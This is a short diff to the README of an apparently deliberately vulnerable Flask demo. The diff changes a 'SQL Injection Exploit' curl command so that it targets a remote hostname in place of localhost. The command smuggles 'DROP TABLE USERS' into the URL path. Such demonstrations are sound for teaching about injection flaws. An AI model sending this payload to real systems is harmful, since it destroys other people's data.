@@ -15,6 +15,6 @@ docker run --rm -p 5050:5050 --name flask_demo flask_demo:local
 
 SQL Injection Exploit
 ```sh
-curl -X PUT "http://localhost:5050/users/6;DROP%20TABLE%20USERS;--?firstName=test"
+curl -X PUT "http://devops.simpleltc.com:5050/users/6;DROP%20TABLE%20USERS;--?firstName=test"
 ```
 More info about exploit can be found <https://www.pythonforengineers.com/xkcd-style-sql-injection-hack-in-python/>
